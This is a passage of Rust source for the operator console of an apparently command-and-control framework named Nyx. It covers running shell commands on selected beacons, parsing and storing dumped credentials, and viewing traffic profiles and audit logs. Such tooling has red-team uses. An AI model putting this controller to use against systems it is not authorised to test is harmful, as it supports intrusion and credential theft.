//! opencode-style fullscreen TUI.
//!
//! Layout:
//! ```text
//! ┌─ Nyx  [● status]  beacon: 3 active ────────────────────────────┐
//! │                                                                  │
//! │  event stream (scrollable: ↑/↓, PgUp/PgDn)                       │
//! │                                                                  │
//! ├──────────────────────────────────────────────────────────────────┤
//! │  ▌ type a command, or / for menu   (Enter · ↑history · Ctrl+C)  │
//! └──────────────────────────────────────────────────────────────────┘
//! ```
//! - Typing anything that doesn't start with `/` → shell command on the
//!   selected beacon (opencode's "just type" feel).
//! - `/` → meta-command; opens a completion popup above the input box.
//! - `/ls` `/ps` `/creds` → run the underlying shell command, parse the output,
//!   and pop a fullscreen table overlay (q/Esc returns).

use std::collections::HashMap;
use std::io::{self, stdout};
use std::time::{Duration, Instant};

use crossterm::event::{
    self, DisableMouseCapture, EnableMouseCapture, Event, KeyCode, KeyEvent, KeyModifiers,
    MouseButton, MouseEvent, MouseEventKind,
};
use crossterm::execute;
use crossterm::terminal::{
    disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen,
};
use ratatui::backend::CrosstermBackend;
use ratatui::layout::Rect;
use ratatui::widgets::ListState;
use ratatui::Terminal;

use crate::rest::{self, Bridge, Cmd, Level, LogLine, ParseAs, ParsedTable};
use crate::types::{CredEntry, FileEntry, ProcEntry, SessionView};

// Pure input/interaction logic lives in its own module for testability.
mod config;
mod credstore;
mod input;
mod panes;
mod render;
mod session_meta;
mod topology;
use input::{
    apply_scroll, filter_meta, move_popup_selection, parse_sleep_args, popup_submit_target, Input,
    PopupMove, ScrollDir, SleepSpec, META_COMMANDS,
};
use render::render;

/// Max lines kept in the event stream (older dropped).
const STREAM_CAP: usize = 5000;

/// What fullscreen overlay table to show (q/Esc dismisses).
#[derive(Default)]
pub(super) enum Overlay {
    #[default]
    None,
    Files(Vec<FileEntry>),
    Procs(Vec<ProcEntry>),
    Creds(Vec<CredEntry>),
    Audit(Vec<crate::rest::AuditRow>),
    Sessions(ListState),
    /// 全字段会话详情；锚定 session id，render 时从 app.sessions 实时查找。
    /// 本地数据 overlay（无 worker round-trip）：pending/age/ja3/ja4 等
    /// SessionView 里一直有但 Sessions 行列表丢弃的字段都在这展示。
    SessionDetail(String),
    Image(String, usize),
    /// 排队中（未投递）的任务表，来自 `GET /api/tasks`。
    Tasks(Vec<crate::rest::TaskRow>),
    Profile {
        loaded: bool,
        http_get_uri: String,
        http_post_uri: String,
        useragent: String,
    },
    AuditVerify {
        ok: bool,
        broken_at: Option<u64>,
    },
}

impl Overlay {
    fn is_open(&self) -> bool {
        !matches!(self, Overlay::None)
    }
}

// ---- app state -------------------------------------------------------------

pub(super) struct App {
    bridge: Bridge,
    pub(super) connected: bool,
    pub(super) sessions: Vec<SessionView>,
    pub(super) selected: Option<usize>, // index into `sessions`
    pub(super) stream: Vec<LogLine>,    // event log
    pub(super) stream_offset: usize,    // for scrolling (0 = bottom)
    pub(super) input: String,
    pub(super) cursor: usize,
    history: Vec<String>,
    hist_idx: Option<usize>,
    pub(super) popup_open: bool,
    pub(super) popup_state: ListState,
    pub(super) overlay: Overlay,
    /// Latest parsed files listing — mirrored from the most recent `/ls` result
    /// so a Files pane view can render it WITHOUT depending on the fullscreen
    /// overlay being open (q/Esc dismisses the overlay but the data persists).
    /// Previously the pane path got hardcoded `Overlay::Files(vec![])`.
    pub(super) files_view: Vec<FileEntry>,
    /// Latest parsed process listing — mirrors `/ps` for the Procs pane view.
    pub(super) procs_view: Vec<ProcEntry>,
    /// Latest parsed credential listing — mirrors `/creds` for the Creds pane.
    pub(super) creds_view: Vec<CredEntry>,
    /// tmux 式窗格树（可递归分割）。
    pub(super) pane_tree: panes::Pane,
    /// 当前焦点叶 id。
    pub(super) focused_pane: usize,
    /// 本地配置（alias 表等），启动时从 ~/.nyx/config.json 加载。
    config: config::Config,
    /// 凭据库（~/.nyx/creds.json），/creds 解析出的凭据自动入库。
    creds: credstore::CredStore,
    /// session 本地元数据（~/.nyx/sessions.json）。
    pub(super) sessions_meta: session_meta::SessionStore,
    /// 每个会话的 age 基线 `(快照时刻, 当时 age_secs)`，用于客户端推算活的 age。
    /// 故意只在工作真发会话列表（签名变化）时更新：基线 = 真实 age 加本地流逝
    /// 秒数，每帧重算不会引入抖动，也不污染 session_signature（后者刻意排除
    /// age_secs 防止 UI 每秒全表重绘）。
    pub(super) age_baseline: HashMap<String, (Instant, u64)>,
    should_quit: bool,
}

impl App {
    fn new(bridge: Bridge) -> Self {
        let mut popup_state = ListState::default();
        popup_state.select(Some(0));
        Self {
            bridge,
            connected: false,
            sessions: Vec::new(),
            selected: None,
            stream: Vec::new(),
            stream_offset: 0,
            input: String::new(),
            cursor: 0,
            history: Vec::new(),
            hist_idx: None,
            popup_open: false,
            popup_state,
            overlay: Overlay::default(),
            files_view: Vec::new(),
            procs_view: Vec::new(),
            creds_view: Vec::new(),
            pane_tree: panes::Pane::single(1),
            focused_pane: 1,
            config: config::Config::load(),
            creds: credstore::CredStore::load(),
            sessions_meta: session_meta::SessionStore::load(),
            age_baseline: HashMap::new(),
            should_quit: false,
        }
    }

    pub(super) fn current_session(&self) -> Option<&SessionView> {
        self.selected.and_then(|i| self.sessions.get(i))
    }

    /// 客户端推算的会话存活秒数。基线 = 最近一次工作线程真发会话列表时的
    /// `(Instant, age_secs)`，加上自此流逝的本地秒数。无基线 → 0。
    ///
    /// 每帧重算不引入抖动：基线只在 session_signature 变化时更新（与
    /// `age_secs` 被刻意排除出 signature 一致），而 age 的秒级递增只体现在
    /// 状态栏/详情 overlay 的单点重绘，不触发会话全表重排。
    pub(super) fn age_for(&self, id: &str) -> u64 {
        match self.age_baseline.get(id) {
            Some((t0, base)) => base.saturating_add(t0.elapsed().as_secs()),
            None => 0,
        }
    }

    fn log(&mut self, text: &str, level: Level) {
        for line in text.lines() {
            self.stream.push(LogLine {
                text: line.to_string(),
                level,
            });
        }
        if self.stream.len() > STREAM_CAP {
            let drop = self.stream.len() - STREAM_CAP;
            self.stream.drain(..drop);
        }
    }

    /// Drain snapshots from the worker (non-blocking).
    fn poll_worker(&mut self) {
        while let Ok(snap) = self.bridge.snapshots.try_recv() {
            self.connected = snap.connected;
            if !snap.sessions.is_empty() {
                // keep selection valid
                if self.selected.is_none_or(|i| i >= snap.sessions.len()) {
                    self.selected = if snap.sessions.is_empty() {
                        None
                    } else {
                        Some(0)
                    };
                }
                self.sessions = snap.sessions;
                // Refresh the age baseline for every live session so age_for()
                // stays accurate between worker polls. 基线 = (现在, 服务器报的 age)。
                let now = Instant::now();
                for s in &self.sessions {
                    self.age_baseline.insert(s.id.clone(), (now, s.age_secs));
                }
            }
            for l in snap.log_lines {
                self.stream.push(l);
            }
            if self.stream.len() > STREAM_CAP {
                let drop = self.stream.len() - STREAM_CAP;
                self.stream.drain(..drop);
            }
            // A parsed table arrived → pop it as the fullscreen overlay AND mirror
            // it into the per-view cache so the in-pane renderers (Ctrl+3/4/5)
            // show real data instead of placeholders. The overlay is dismissible
            // (q/Esc); the cached view data persists so a pane keeps its content
            // after the overlay closes.
            if let Some(table) = snap.parsed {
                self.overlay = match table {
                    ParsedTable::Files(rows) => {
                        if rows.is_empty() {
                            self.log("(no files parsed)", Level::Warn);
                            Overlay::None
                        } else {
                            self.files_view = rows.clone();
                            Overlay::Files(rows)
                        }
                    }
                    ParsedTable::Procs(rows) => {
                        if rows.is_empty() {
                            self.log("(no processes parsed)", Level::Warn);
                            Overlay::None
                        } else {
                            self.procs_view = rows.clone();
                            Overlay::Procs(rows)
                        }
                    }
                    ParsedTable::Creds(rows) => {
                        if rows.is_empty() {
                            self.log("(no credentials parsed)", Level::Warn);
                            Overlay::None
                        } else {
                            // 落盘到凭据库（按 principal+secret+kind 去重）
                            let beacon_id = self.current_session().map(|s| s.id.clone());
                            let added = self.creds.ingest(&rows, beacon_id.as_deref());
                            if let Err(e) = self.creds.save() {
                                self.log(&format!("! save creds: {e}"), Level::Err);
                            }
                            if added > 0 {
                                self.log(
                                    &format!(
                                        "credstore: +{added} new (total {})",
                                        self.creds.entries.len()
                                    ),
                                    Level::Ok,
                                );
                            }
                            self.creds_view = rows.clone();
                            Overlay::Creds(rows)
                        }
                    }
                    ParsedTable::Audit(rows) => {
                        if rows.is_empty() {
                            self.log("(audit log empty)", Level::Warn);
                            Overlay::None
                        } else {
                            Overlay::Audit(rows)
                        }
                    }
                    ParsedTable::Image { path, bytes } => {
                        if path.is_empty() {
                            self.log("(screenshot: no path)", Level::Warn);
                            Overlay::None
                        } else {
                            self.log(
                                &format!("screenshot saved ({} bytes): {}", bytes, path),
                                Level::Ok,
                            );
                            Overlay::Image(path, bytes)
                        }
                    }
                    ParsedTable::Profile {
                        loaded,
                        http_get_uri,
                        http_post_uri,
                        useragent,
                    } => {
                        if !loaded {
                            self.log("(profile: not loaded)", Level::Warn);
                            Overlay::None
                        } else {
                            self.log(
                &format!(
                    "profile: loaded: {loaded} http-get: {http_get_uri} http-post: {http_post_uri} useragent: {useragent}"
                ),
                Level::Info,
            );
                            Overlay::Profile {
                                loaded,
                                http_get_uri,
                                http_post_uri,
                                useragent,
                            }
                        }
                    }
                    ParsedTable::AuditVerify { ok, broken_at } => {
                        if ok {
                            self.log("audit chain: OK", Level::Ok);
                        } else if let Some(b) = broken_at {
                            self.log(&format!("audit chain: BROKEN at seq {b}"), Level::Err);
                        } else {
                            self.log("audit chain: UNKNOWN", Level::Warn);
                        }
                        Overlay::AuditVerify { ok, broken_at }
                    }
                    ParsedTable::Tasks(rows) => {
                        if rows.is_empty() {
                            self.log("(no queued tasks)", Level::Info);
                            Overlay::None
                        } else {
                            Overlay::Tasks(rows)
                        }
                    }
                };
            }
        }
    }

    fn send(&self, cmd: Cmd) {
        let _ = self.bridge.cmds.send(cmd);
    }

    fn handle_key(&mut self, key: KeyEvent) {
        // Overlay takes priority when open (q/Esc/jk/Enter to pick sessions).
        if self.overlay.is_open() {
            self.handle_overlay_key(key);
            return;
        }
        // Ctrl+C always quits.
        if key.modifiers.contains(KeyModifiers::CONTROL) && key.code == KeyCode::Char('c') {
            self.should_quit = true;
            return;
        }
        if key.modifiers.contains(KeyModifiers::CONTROL) {
            match key.code {
                KeyCode::Char('l') => {
                    self.stream.clear();
                    return;
                }
                KeyCode::Char('u') => {
                    self.input.clear();
                    self.cursor = 0;
                    self.popup_open = false;
                    return;
                }
                // ---- 窗格管理（tmux 式）----
                KeyCode::Char('h') => {
                    // 焦点左移
                    let full = Rect::new(0, 0, 80, 24);
                    self.focused_pane = self.pane_tree.clone().move_focus(
                        self.focused_pane,
                        panes::FocusDir::Left,
                        full,
                    );
                    return;
                }
                KeyCode::Char('j') => {
                    let full = Rect::new(0, 0, 80, 24);
                    self.focused_pane = self.pane_tree.clone().move_focus(
                        self.focused_pane,
                        panes::FocusDir::Down,
                        full,
                    );
                    return;
                }
                KeyCode::Char('k') => {
                    let full = Rect::new(0, 0, 80, 24);
                    self.focused_pane = self.pane_tree.clone().move_focus(
                        self.focused_pane,
                        panes::FocusDir::Up,
                        full,
                    );
                    return;
                }
                // Ctrl+L 已被 clear 占用，焦点右移用 Ctrl+f (forward)
                KeyCode::Char('f') => {
                    let full = Rect::new(0, 0, 80, 24);
                    self.focused_pane = self.pane_tree.clone().move_focus(
                        self.focused_pane,
                        panes::FocusDir::Right,
                        full,
                    );
                    return;
                }
                KeyCode::Char('%') => {
                    // 垂直分割（左右）
                    let new_id = self.pane_tree.next_id();
                    self.pane_tree = self
                        .pane_tree
                        .clone()
                        .split(self.focused_pane, panes::SplitDir::Vertical);
                    self.focused_pane = new_id;
                    return;
                }
                KeyCode::Char('"') => {
                    // 水平分割（上下）
                    let new_id = self.pane_tree.next_id();
                    self.pane_tree = self
                        .pane_tree
                        .clone()
                        .split(self.focused_pane, panes::SplitDir::Horizontal);
                    self.focused_pane = new_id;
                    return;
                }
                KeyCode::Char('x') => {
                    // 关闭当前窗格
                    let closed = self.focused_pane;
                    self.pane_tree = self.pane_tree.clone().close(closed);
                    // 焦点移到第一个叶
                    self.focused_pane = self
                        .pane_tree
                        .leaves()
                        .first()
                        .map(|(id, _)| *id)
                        .unwrap_or(1);
                    return;
                }
                KeyCode::Char(c @ ('1'..='6')) => {
                    // 切换焦点窗格视图
                    if let Some(view) = panes::PaneView::from_index(c as u8 - b'0') {
                        self.pane_tree = self.pane_tree.clone().set_view(self.focused_pane, view);
                    }
                    return;
                }
                _ => {}
            }
        }
        // Scroll keys (work even while typing).
        match key.code {
            KeyCode::PageUp => {
                self.stream_offset = self.stream_offset.saturating_add(10);
                return;
            }
            KeyCode::PageDown => {
                self.stream_offset = self.stream_offset.saturating_sub(10);
                return;
            }
            KeyCode::Up if key.modifiers.contains(KeyModifiers::ALT) => {
                self.stream_offset = self.stream_offset.saturating_add(1);
                return;
            }
            KeyCode::Down if key.modifiers.contains(KeyModifiers::ALT) => {
                self.stream_offset = self.stream_offset.saturating_sub(1);
                return;
            }
            _ => {}
        }

        match key.code {
            KeyCode::Enter => {
                // If the popup is open and we can resolve the typed prefix to a
                // command, replace the input with the resolved command name and
                // run it. This makes `/ls<Enter>` and `/s↑<Enter>` both work.
                if self.popup_open {
                    if let Some(name) =
                        popup_submit_target(&self.input, self.popup_state.selected())
                    {
                        self.input = name.to_string();
                        self.cursor = self.input.len();
                    }
                }
                self.submit();
            }
            KeyCode::Esc => {
                self.input.clear();
                self.cursor = 0;
                self.popup_open = false;
            }
            KeyCode::Backspace => {
                if self.cursor > 0 && self.cursor <= self.input.len() {
                    self.input.remove(self.cursor - 1);
                    self.cursor -= 1;
                }
                if self.input.is_empty() || !self.input.starts_with('/') {
                    self.popup_open = false;
                } else {
                    // re-filter + clamp selection as the prefix shrinks
                    let filtered = filter_meta(&self.input);
                    self.popup_state
                        .select(if filtered.is_empty() { None } else { Some(0) });
                }
            }
            // When the popup is open, ↑/↓ navigate the menu (opencode-style);
            // otherwise they walk input history.
            KeyCode::Up if self.popup_open => {
                let filtered = filter_meta(&self.input);
                let next = move_popup_selection(
                    filtered.len(),
                    self.popup_state.selected(),
                    PopupMove::Up,
                );
                self.popup_state.select(next);
            }
            KeyCode::Down if self.popup_open => {
                let filtered = filter_meta(&self.input);
                let next = move_popup_selection(
                    filtered.len(),
                    self.popup_state.selected(),
                    PopupMove::Down,
                );
                self.popup_state.select(next);
            }
            KeyCode::Up => {
                // input history navigation
                if !self.history.is_empty() {
                    let idx = match self.hist_idx {
                        Some(i) => i.saturating_sub(1),
                        None => self.history.len() - 1,
                    };
                    self.hist_idx = Some(idx);
                    self.input = self.history[idx].clone();
                    self.cursor = self.input.len();
                }
            }
            KeyCode::Down => {
                if let Some(i) = self.hist_idx {
                    let next = i + 1;
                    if next < self.history.len() {
                        self.hist_idx = Some(next);
                        self.input = self.history[next].clone();
                    } else {
                        self.hist_idx = None;
                        self.input.clear();
                    }
                    self.cursor = self.input.len();
                }
            }
            KeyCode::Left => self.cursor = self.cursor.saturating_sub(1),
            KeyCode::Right => {
                self.cursor = (self.cursor + 1).min(self.input.len());
            }
            KeyCode::Tab if self.popup_open => {
                // Tab completes to the selected popup entry (still available
                // alongside ↑↓+Enter for users who prefer it).
                let filtered = filter_meta(&self.input);
                if let Some(sel) = self.popup_state.selected() {
                    if let Some(m) = filtered.get(sel) {
                        self.input = format!("{} ", m.name);
                        self.cursor = self.input.len();
                    }
                }
            }
            KeyCode::Char(c) => {
                self.input.insert(self.cursor, c);
                self.cursor += 1;
                if self.input.starts_with('/') {
                    self.popup_open = true;
                    let filtered = filter_meta(&self.input);
                    // keep selection if still valid, else reset to top
                    let keep = self.popup_state.selected().filter(|&i| i < filtered.len());
                    self.popup_state.select(keep.or(if filtered.is_empty() {
                        None
                    } else {
                        Some(0)
                    }));
                } else {
                    self.popup_open = false;
                }
            }
            _ => {}
        }
    }

    fn handle_overlay_key(&mut self, key: KeyEvent) {
        match &mut self.overlay {
            Overlay::Sessions(state) => match key.code {
                KeyCode::Char('j') | KeyCode::Down => {
                    let i = state.selected().unwrap_or(0);
                    if i + 1 < self.sessions.len() {
                        state.select(Some(i + 1));
                    }
                }
                KeyCode::Char('k') | KeyCode::Up => {
                    let i = state.selected().unwrap_or(0);
                    state.select(Some(i.saturating_sub(1)));
                }
                KeyCode::Enter => {
                    if let Some(i) = state.selected() {
                        self.selected = Some(i);
                        if let Some(s) = self.sessions.get(i) {
                            self.log(&format!("selected beacon {}", short(&s.id)), Level::Ok);
                        }
                    }
                    self.overlay = Overlay::None;
                }
                KeyCode::Char('q') | KeyCode::Esc => self.overlay = Overlay::None,
                _ => {}
            },
            Overlay::None => {}
            _ => match key.code {
                KeyCode::Char('q') | KeyCode::Esc => self.overlay = Overlay::None,
                _ => {}
            },
        }
    }

    /// Handle a mouse event. Scroll wheels (and touchpad two-finger scrolls)
    /// move the active scroll surface: the fullscreen overlay if one is open,
    /// otherwise the main event stream. A left-click inside an open overlay
    /// selects the clicked row; a second click confirms it.
    fn handle_mouse(&mut self, ev: MouseEvent) {
        match ev.kind {
            // Wheel / touchpad vertical scroll.
            MouseEventKind::ScrollUp => self.scroll(ScrollDir::Up, 3),
            MouseEventKind::ScrollDown => self.scroll(ScrollDir::Down, 3),
            // Some terminals emit horizontal gestures as ScrollLeft/Right; treat
            // them as vertical for convenience (rare, but harmless).
            MouseEventKind::ScrollLeft => self.scroll(ScrollDir::Up, 1),
            MouseEventKind::ScrollRight => self.scroll(ScrollDir::Down, 1),
            // Click-to-select inside an overlay (sessions table) or popup menu.
            MouseEventKind::Down(MouseButton::Left) => self.click(ev.row),
            _ => {}
        }
    }

    /// Move the active scroll surface by `amount` lines in `dir`.
    fn scroll(&mut self, dir: ScrollDir, amount: usize) {
        match &mut self.overlay {
            // The tables (files/procs/creds) and sessions list are short and
            // top-anchored — scrolling them would need per-table state we don't
            // keep yet, so for now scrolling dismisses nothing but routes to the
            // main stream (the long-lived, scrollable surface).
            Overlay::None => {
                self.stream_offset = apply_scroll(self.stream_offset, dir, amount);
            }
            _ => {
                // An overlay is open. Let the user scroll the underlying stream
                // too, so reading history while a table is up stays ergonomic.
                self.stream_offset = apply_scroll(self.stream_offset, dir, amount);
            }
        }
    }

    /// Handle a left-click at terminal row `row`. If an overlay or popup is
    /// open and the click lands inside it, select/activate the corresponding row.
    fn click(&mut self, row: u16) {
        // Sessions overlay: click a row to select it; the row index maps from
        // (click_row - overlay_top). We don't track the exact rendered rect, so
        // we approximate: the overlay is inset by 1 row at top and the list body
        // starts one row below its title.
        if let Overlay::Sessions(state) = &mut self.overlay {
            // Overlay starts at full.y + 1, title is row 0 of the block.
            let body_start = 2u16; // approx: title row + header gap
            if row >= body_start {
                let idx = (row - body_start) as usize;
                if idx < self.sessions.len() {
                    state.select(Some(idx));
                    // second behavior: clicking also confirms the selection.
                    self.selected = Some(idx);
                    if let Some(s) = self.sessions.get(idx) {
                        self.log(&format!("selected beacon {}", short(&s.id)), Level::Ok);
                    }
                    self.overlay = Overlay::None;
                }
            }
        }
    }

    fn submit(&mut self) {
        let raw = std::mem::take(&mut self.input);
        self.cursor = 0;
        self.popup_open = false;
        if !raw.trim().is_empty() {
            self.history.push(raw.clone());
            self.hist_idx = None;
        }
        match input::classify_with(&raw, &self.config.aliases) {
            Input::Empty => {}
            Input::Shell(cmd) => self.run_shell(&cmd),
            Input::Meta { name, args } => self.run_meta(&name, &args),
        }
    }

    fn run_shell(&mut self, cmd: &str) {
        let Some(s) = self.current_session().cloned() else {
            self.log(
                "! no beacon selected — use /use <id> or /sessions",
                Level::Err,
            );
            return;
        };
        self.log(&format!("[{}] $ {}", short(&s.id), cmd), Level::Info);
        self.send(Cmd::Shell {
            session: s.id,
            args: cmd.to_string(),
            parse: ParseAs::None,
        });
    }

    fn run_meta(&mut self, name: &str, args: &str) {
        match name {
            "/help" => {
                for m in META_COMMANDS {
                    self.log(
                        &format!("{:14} {:18} {}", m.name, m.args_hint, m.help),
                        Level::Info,
                    );
                }
            }
            "/clear" => self.stream.clear(),
            "/alias" => {
                // /alias add <name> <command...>  /  /alias rm <name>  /  /alias list
                let mut parts = args.split_whitespace();
                match parts.next() {
                    Some("add") => {
                        let name = match parts.next() {
                            Some(n) => n.to_string(),
                            None => {
                                self.log("usage: /alias add <name> <command...>", Level::Warn);
                                return;
                            }
                        };
                        let cmd: String = parts.collect::<Vec<_>>().join(" ");
                        if cmd.is_empty() {
                            self.log("usage: /alias add <name> <command...>", Level::Warn);
                            return;
                        }
                        self.config.set_alias(&name, &cmd);
                        match self.config.save() {
                            Ok(()) => self.log(&format!("alias {name} = {cmd}"), Level::Ok),
                            Err(e) => self.log(&format!("! save alias: {e}"), Level::Err),
                        }
                    }
                    Some("rm") | Some("del") | Some("remove") => {
                        let name = match parts.next() {
                            Some(n) => n.to_string(),
                            None => {
                                self.log("usage: /alias rm <name>", Level::Warn);
                                return;
                            }
                        };
                        if self.config.del_alias(&name) {
                            let _ = self.config.save();
                            self.log(&format!("removed alias {name}"), Level::Ok);
                        } else {
                            self.log(&format!("! no alias named {name}"), Level::Warn);
                        }
                    }
                    Some("list") | None => {
                        if self.config.aliases.is_empty() {
                            self.log("(no aliases)", Level::Warn);
                        } else {
                            let pairs: Vec<(String, String)> = self
                                .config
                                .aliases
                                .iter()
                                .map(|(n, c)| (n.clone(), c.clone()))
                                .collect();
                            for (n, c) in &pairs {
                                self.log(&format!("  {n} = {c}"), Level::Info);
                            }
                        }
                    }
                    Some(other) => self.log(
                        &format!("! /alias: unknown subcommand '{other}' (add/rm/list)"),
                        Level::Err,
                    ),
                }
            }
            "/topo" => {
                // 用拓扑布局算法画 session 关系图。
                let nodes: Vec<(String, String)> = self
                    .sessions
                    .iter()
                    .map(|s| {
                        let label = self
                            .sessions_meta
                            .get(&s.id)
                            .alias
                            .clone()
                            .unwrap_or_else(|| s.hostname.clone());
                        (s.id.clone(), label)
                    })
                    .collect();
                let topo = topology::layout(&nodes, &[]);
                if topo.nodes.is_empty() {
                    self.log("(no beacons to graph)", Level::Warn);
                } else {
                    self.log(
                        &format!(
                            "╔══ topology: {} nodes, {} edges ═══",
                            topo.nodes.len(),
                            topo.edges.len()
                        ),
                        Level::Info,
                    );
                    // 按层分组渲染 ASCII 树
                    let max_y = topo.nodes.iter().map(|n| n.y).max().unwrap_or(0);
                    for layer in 0..=max_y {
                        let layer_nodes: Vec<&topology::TopoNode> =
                            topo.nodes.iter().filter(|n| n.y == layer).collect();
                        if layer_nodes.is_empty() {
                            continue;
                        }
                        // 层标签
                        if layer == 0 {
                            self.log("║", Level::Info);
                        }
                        // 节点行
                        let node_strs: Vec<String> = layer_nodes
                            .iter()
                            .map(|n| {
                                let mark = if n.is_beacon { "◆" } else { "◇" };
                                let star = if self.sessions_meta.get(&n.id).favorite {
                                    " ★"
                                } else {
                                    ""
                                };
                                format!("{mark} {}{star}", n.label)
                            })
                            .collect();
                        self.log(
                            &format!("║  L{}  {}", layer, node_strs.join("  ──→  ")),
                            Level::Info,
                        );
                        // 连接线（非最后一层）
                        if layer < max_y {
                            self.log("║  │", Level::Info);
                        }
                    }
                    // 边列表
                    if !topo.edges.is_empty() {
                        self.log("║", Level::Info);
                        self.log("║  edges:", Level::Info);
                        for e in &topo.edges {
                            self.log(
                                &format!(
                                    "║    {} ─{}→ {}",
                                    short_topo(&topo, &e.from),
                                    e.label,
                                    short_topo(&topo, &e.to)
                                ),
                                Level::Info,
                            );
                        }
                    }
                    self.log("╚══════════════════════════════", Level::Info);
                }
            }
            "/creds" => {
                // /creds                 — 列出整个凭据库
                // /creds export json|csv — 导出
                // /creds find <query>    — 搜索（kind:hash / user:admin）
                // /creds sync [reveal]   — 从 server /api/creds 拉取并入库
                // /creds <shell cmd>     — 跑 shell dump，结果解析后入库
                let sub = args.trim();
                if sub == "export json" {
                    self.log(&self.creds.export_json(), Level::Info);
                } else if sub == "export csv" {
                    self.log(&self.creds.export_csv(), Level::Info);
                } else if let Some(query) = sub.strip_prefix("find ") {
                    // 搜索凭据库
                    let hits = self.creds.search(query.trim());
                    if hits.is_empty() {
                        self.log(&format!("(no creds match '{query}')"), Level::Warn);
                    } else {
                        let rows: Vec<CredEntry> = hits
                            .iter()
                            .map(|c| CredEntry {
                                source: c.source.clone(),
                                principal: c.principal.clone(),
                                kind: c.kind,
                                secret: c.secret.clone(),
                            })
                            .collect();
                        self.log(&format!("{} match(es)", rows.len()), Level::Ok);
                        self.overlay = Overlay::Creds(rows);
                    }
                } else if sub == "list" || sub.is_empty() {
                    if self.creds.entries.is_empty() {
                        self.log(
                            "(credstore empty — run a cred dump BOF or /creds sync first)",
                            Level::Warn,
                        );
                    } else {
                        let rows: Vec<CredEntry> = self
                            .creds
                            .entries
                            .iter()
                            .map(|c| CredEntry {
                                source: c.source.clone(),
                                principal: c.principal.clone(),
                                kind: c.kind,
                                secret: c.secret.clone(),
                            })
                            .collect();
                        self.overlay = Overlay::Creds(rows);
                    }
                } else if sub.starts_with("add ") {
                    let mut parts = sub.split_whitespace().skip(1);
                    let realm = parts.next().unwrap_or("").to_string();
                    let user = parts.next().unwrap_or("").to_string();
                    let kind = parts.next().unwrap_or("").to_string();
                    let secret = parts.next().unwrap_or("").to_string();
                    if realm.is_empty() || user.is_empty() || kind.is_empty() || secret.is_empty() {
                        self.log(
                            "usage: /creds add <realm> <user> <kind> <secret>",
                            Level::Warn,
                        );
                        return;
                    }
                    self.send(crate::rest::Cmd::AddCred {
                        realm,
                        user,
                        kind,
                        secret,
                    });
                } else if sub.starts_with("del ") {
                    let mut parts = sub.split_whitespace().skip(1);
                    let realm = parts.next().unwrap_or("").to_string();
                    let user = parts.next().unwrap_or("").to_string();
                    let kind = parts.next().unwrap_or("").to_string();
                    if realm.is_empty() || user.is_empty() || kind.is_empty() {
                        self.log("usage: /creds del <realm> <user> <kind>", Level::Warn);
                        return;
                    }
                    self.send(crate::rest::Cmd::DelCred { realm, user, kind });
                } else if sub == "sync" || sub.starts_with("sync ") {
                    let reveal = sub.contains("reveal");
                    self.send(Cmd::FetchCreds { reveal });
                } else {
                    // 当作 shell 命令跑，结果解析后入库
                    self.run_parsed_shell(sub, "/creds", ShellFor::Creds);
                }
            }
            "/profile" => {
                self.send(crate::rest::Cmd::FetchProfile);
            }
            "/chan" => {
                let mut parts = args.split_whitespace();
                let sub = match parts.next() {
                    Some(s) => s,
                    None => {
                        self.log("usage: /chan close <id>", Level::Warn);
                        return;
                    }
                };
                if sub == "close" {
                    let chan: u32 = match parts.next().and_then(|x| x.parse().ok()) {
                        Some(c) => c,
                        None => {
                            self.log("usage: /chan close <id>", Level::Warn);
                            return;
                        }
                    };
                    self.send(crate::rest::Cmd::CloseChan { chan });
                } else {
                    self.log(
                        &format!("! /chan: unknown subcommand '{sub}' (close)"),
                        Level::Err,
                    );
                }
            }
            "/audit" => {
                let sub = args.trim();
                if sub == "verify" {
                    self.send(crate::rest::Cmd::VerifyAudit);
                    return;
                }
                // /audit                       — 全量审计日志
                // /audit operator <name>       — 按操作员过滤
                // /audit action <task|cred_*>  — 按动作过滤
                // /audit limit <n>             — 限制条数
                let mut filters: Option<String> = None;
                let mut operator: Option<String> = None;
                let mut action: Option<String> = None;
                let mut limit: Option<u32> = None;
                let mut it = args.split_whitespace();
                while let Some(k) = it.next() {
                    match k {
                        "operator" => operator = it.next().map(|s| s.to_string()),
                        "action" => action = it.next().map(|s| s.to_string()),
                        "limit" => limit = it.next().and_then(|s| s.parse().ok()),
                        _ => {
                            filters = Some(k.to_string());
                        }
                    }
                }
                let _ = filters;
                self.send(Cmd::FetchAudit {
                    operator,
                    action,
                    limit,
                });
            }
            "/connect" => {
                let mut parts = args.split_whitespace();
                let url = match parts.next() {
                    Some(u) => u.to_string(),
                    None => {
                        self.log("usage: /connect <url> [token]", Level::Warn);
                        return;
                    }
                };
                let token = parts.next().map(|s| s.to_string());
                self.log(&format!("connecting to {url} …",), Level::Info);
                self.send(Cmd::Connect(url, token));
            }
            "/sessions" => {
                if self.sessions.is_empty() {
                    self.log("(no beacons)", Level::Warn);
                } else {
                    // 支持过滤：/sessions tag:web star alias:db
                    let filter = session_meta::parse_filter(args);
                    let filtered: Vec<usize> = self
                        .sessions
                        .iter()
                        .enumerate()
                        .filter(|(_, s)| {
                            let m = self.sessions_meta.get(&s.id);
                            let tags_ok = filter.tags.iter().all(|t| m.tags.iter().any(|x| x == t));
                            let star_ok = !filter.star_only || m.favorite;
                            let alias_ok = filter.alias_contains.as_ref().is_none_or(|sub| {
                                m.alias.as_ref().is_some_and(|a| a.contains(sub))
                                    || s.hostname.contains(sub)
                            });
                            tags_ok && star_ok && alias_ok
                        })
                        .map(|(i, _)| i)
                        .collect();
                    if filtered.is_empty() {
                        self.log(&format!("(no beacons match '{args}')",), Level::Warn);
                    } else {
                        let mut st = ListState::default();
                        st.select(
                            self.selected
                                .filter(|i| filtered.contains(i))
                                .or(filtered.first().copied()),
                        );
                        self.overlay = Overlay::Sessions(st);
                    }
                }
            }
            "/info" => {
                // 全字段会话详情 overlay：把 SessionView 里一直有但 Sessions 行
                // 列表/状态栏放不下的字段（pid/pending/age/ja3/ja4 + 本地 meta）
                // 一次性展示。本地数据 overlay，无 worker round-trip。
                match self.current_session() {
                    Some(s) => self.overlay = Overlay::SessionDetail(s.id.clone()),
                    None => self.log("! no beacon selected", Level::Warn),
                }
            }
            "/tasks" => {
                // 拉取当前会话排队中（未投递）的任务。worker-driven overlay，
                // 仿 /audit。解决"任务下发后状态黑盒"——看不到是还在排队还是已投递。
                match self.current_session() {
                    Some(s) => self.send(Cmd::FetchTasks {
                        session: s.id.clone(),
                    }),
                    None => self.log("! no beacon selected", Level::Warn),
                }
            }
            "/use" => {
                let id = args.trim();
                if id.is_empty() {
